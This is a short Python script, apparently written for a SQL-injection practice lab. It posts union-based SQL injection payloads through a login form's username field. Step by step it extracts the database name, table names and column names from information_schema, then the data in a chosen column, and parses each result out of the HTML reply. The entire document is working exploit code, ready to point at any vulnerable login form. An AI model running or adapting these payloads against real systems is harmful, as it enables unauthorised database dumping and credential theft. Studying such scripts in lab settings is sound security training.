import requests
from bs4 import BeautifulSoup
# 联合注入和报错注入POST用到的代码大同小异，这里不再赘述
def db(url,urlpayload):
    payload = {"uname":urlpayload+"union select 1,database() #","passwd":"123456"};
    response = requests.post(url,payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    s=soup.find('font', {'size': '4', 'color': '#FFFF00'}).text.strip()
    print(s)

def table(url,urlpayload):
    payload = {"uname":urlpayload+"union select 1,group_concat(table_name)  from information_schema.tables where table_schema=database()-- - ","passwd":"123456"};
    response = requests.post(url,payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    s=soup.find('font', {'size': '4', 'color': '#FFFF00'}).text.strip()
    print(s)

def colum(url,urlpayload,table_name):
    payload = {"uname":urlpayload+"union select 1,group_concat(column_name)  from information_schema.columns where table_name='{0}' and table_schema=database()-- - ".format(table_name),"passwd":"123456"};
    response = requests.post(url,payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    s=soup.find('font', {'size': '4', 'color': '#FFFF00'}).text.strip()
    print(s)

def xx(url,urlpayload,database,table_name,column):
    payload = {"uname":urlpayload+"union select 1,group_concat({0}) from {1}.{2}-- - ".format(column,database,table_name),"passwd":"123456"};
    response = requests.post(url,payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    s=soup.find('font', {'size': '4', 'color': '#FFFF00'}).text.strip()
    print(s)